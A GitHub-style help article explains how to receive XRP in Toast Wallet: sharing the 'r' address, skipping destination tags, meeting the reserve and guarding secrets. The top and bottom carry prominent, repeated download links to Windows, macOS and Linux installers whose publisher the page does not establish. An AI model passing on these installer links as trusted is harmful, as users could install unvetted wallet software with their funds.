<p align="center"><img src="https://github.com/Toast-Wallet/learn/raw/HEAD/assets/banner-article.png" alt="Toast Wallet banner" width="100%"></p>

<h1 align="center">Receive XRP in Toast Wallet</h1>

<p align="center">Share the right address and confirm the payment arrived.</p>

<p align="center">
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet.Setup.3.0.0.exe"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-WINDOWS-1f5fbf?style=for-the-badge&logo=windows&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Windows"></a>
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0.dmg"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-MACOS-1f5fbf?style=for-the-badge&logo=apple&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Macos"></a>
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-x86_64.AppImage"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-LINUX-1f5fbf?style=for-the-badge&logo=linux&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Linux"></a>
</p>

| Platform | File |
|:--|:--|
| 🪟 Windows | [`ToastWallet.Setup.3.0.0.exe`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet.Setup.3.0.0.exe) |
| 🍎 macOS | [`ToastWallet-3.0.0.dmg`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0.dmg) |
| 🐧 Linux | [`ToastWallet-3.0.0-x86_64.AppImage`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-x86_64.AppImage) |

All versions and checksums are on the [Toast Wallet 3.0.0 release page](https://github.com/Toast-Wallet/core/releases/tag/3.0.0).

> [!IMPORTANT]
> Only download from this GitHub release page.

---

## 💡 Short answer

Open the account in the [latest Toast Wallet](https://github.com/Toast-Wallet/core/releases/tag/3.0.0), copy its address beginning with `r`, and give that address to the sender. A personal Toast account does not need a destination tag. If the account is brand new, the first payment must cover the XRP Ledger reserve.

## 👀 You'll see this if

- You want someone to send you XRP.
- You are withdrawing XRP from an exchange to Toast Wallet.
- An exchange asks for a destination tag and you are not sure what to put.
- You sent XRP to your Toast address and it has not appeared yet.

## 🤔 Why it matters

Receiving seems simple, but small details cause most problems. Sharing the wrong address, or an address from an old wallet you no longer control, sends XRP somewhere you cannot reach. Withdrawing a very small amount to a new, unactivated address can fail because of the reserve. And confusion about destination tags leads people to invent numbers that are not needed.

Your `r` address is public. Sharing it is safe. What you never share is anything secret: the secret key starting with `s`, your passphrase, your six words or your backup code.

## 🧭 Before you start

Open Toast Wallet and check which account you want to receive into. If you have several accounts, note the first and last characters of the address so you can confirm it later. If the account is new, read [activate a new Toast Wallet account](https://github.com/Toast-Wallet/learn/blob/main/how-to/activate-new-toast-wallet-account.md) first.

## 🛠️ Fix: receive step by step

1. **Open and unlock Toast Wallet.**
2. **Select the account** that should receive the XRP.
3. **Copy the address.** Use the copy option rather than typing it. It starts with `r`.
4. **Share it with the sender.** Paste it into the exchange's withdrawal form or a message to the sender.
5. **Leave the destination tag empty** unless you have a specific reason. Personal wallets do not need one; read [Toast Wallet destination tag guide](https://github.com/Toast-Wallet/learn/blob/main/how-to/toast-wallet-destination-tag-guide.md) for the details.
6. **Ask for a small test** for a first-time transfer from an exchange.
7. **Wait a few seconds.** The balance updates once the payment is confirmed on the XRP Ledger.
8. **Confirm the amount** and tell the sender it arrived.

## 🧩 Real-world example

A user buys XRP on an exchange and wants it in their own wallet. They copy their Toast address, paste it into the exchange withdrawal form, leave the tag field empty because Toast is a personal wallet, and withdraw a small amount first. It arrives in Toast Wallet within a minute. They then withdraw the rest.

## ⚠️ Common mistakes

- Sharing an address from an old wallet whose backup is lost.
- Withdrawing less than the reserve to a new, unactivated address.
- Making up a destination tag because a form shows the field.
- Sharing a secret key instead of the address while asking for help.

## 🔁 If that did not work

- **Nothing arrives.** Check the address the sender used and look for the transaction in your history; see [Toast Wallet transaction not showing](https://github.com/Toast-Wallet/learn/blob/main/how-to/toast-wallet-transaction-not-showing.md).
- **The exchange says the address is not activated.** Send at least the reserve amount; see [activate a new Toast Wallet account](https://github.com/Toast-Wallet/learn/blob/main/how-to/activate-new-toast-wallet-account.md).
- **The balance shows zero after receiving.** Read [Toast Wallet balance shows zero](https://github.com/Toast-Wallet/learn/blob/main/how-to/toast-wallet-balance-shows-zero.md).

## 🛡️ Prevention

Make a backup code before receiving into a new account, so the funds are recoverable from the start. Keep your address list labelled so you never share an address you do not control.

## 🔍 A closer look at sharing your address

There are several ways to share your address: copying and pasting it into a form, sending it in a message, or reading it out. Copying is the most reliable. When you send it in a message, re-read the message before sending to make sure the whole address is there and nothing was cut off at the end. When reading it out loud, spell every character and have the other person read it back.

Remember that an address is public but not anonymous. Anyone who knows it can look up its balance and history on public XRP Ledger explorers. If privacy matters to you, consider using a separate account for receiving from people you do not know well, and move funds to your main account later.

## 🗂️ When you receive from an exchange

Exchanges add a few steps of their own. Many require you to add the destination address to an address book before withdrawing, sometimes with email confirmation and a waiting period. Some have minimum withdrawal amounts that are higher than the XRP Ledger reserve. If the exchange form has a tag or memo field, it is usually optional for personal wallets; leave it empty unless you have a specific reason. After the withdrawal, the exchange shows a transaction ID, which you can keep in case the payment needs to be traced.

Finally, check the network selection. Exchanges sometimes list XRP on more than one network. Choose the XRP Ledger network, because that is the one Toast Wallet uses.

## 🧠 Remember

Receiving needs only your `r` address. No passphrase, no words, no backup code and, for a personal Toast account, no destination tag. Back up the account before funding it, ask for a small test the first time, and you are ready to receive any amount.

## ❓ FAQ

<details>
<summary>Is it safe to post my address?</summary>

Yes, it is public. Remember that anyone can then see its balance on public explorers.

</details>

<details>
<summary>Can I receive tokens other than XRP?</summary>

Toast Wallet is for XRP only.

</details>

<details>
<summary>Why does receiving not ask for my passphrase?</summary>

Receiving does not require signing anything. Only sending does.

</details>

> [!WARNING]
> No one needs your secret key, passphrase, words or backup code to send you XRP. Share only your `r` address.

---

## ⬇️ Download Toast Wallet 3.0.0

<p align="center">
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet.Setup.3.0.0.exe"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-WINDOWS-1f5fbf?style=for-the-badge&logo=windows&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Windows"></a>
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0.dmg"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-MACOS-1f5fbf?style=for-the-badge&logo=apple&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Macos"></a>
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-x86_64.AppImage"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-LINUX-1f5fbf?style=for-the-badge&logo=linux&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Linux"></a>
</p>

| Platform | File |
|:--|:--|
| 🪟 Windows | [`ToastWallet.Setup.3.0.0.exe`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet.Setup.3.0.0.exe) |
| 🍎 macOS | [`ToastWallet-3.0.0.dmg`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0.dmg) |
| 🐧 Linux | [`ToastWallet-3.0.0-x86_64.AppImage`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-x86_64.AppImage) |

Checksums for every file are on the [official Toast Wallet 3.0.0 release](https://github.com/Toast-Wallet/core/releases/tag/3.0.0). More guides live in the [Toast Wallet learn hub](https://github.com/Toast-Wallet/learn).

---

## 📚 Related articles

| Guide | What it covers |
|:--|:--|
| [Activate a new Toast Wallet account](https://github.com/Toast-Wallet/learn/blob/main/how-to/activate-new-toast-wallet-account.md) | Fund a new address with enough XRP to meet the reserve. |
| [Toast Wallet transaction not showing](https://github.com/Toast-Wallet/learn/blob/main/how-to/toast-wallet-transaction-not-showing.md) | Checks to run when a sent or received payment is missing. |
| [Toast Wallet destination tag guide](https://github.com/Toast-Wallet/learn/blob/main/how-to/toast-wallet-destination-tag-guide.md) | When a tag is required and what happens if it is missing. |
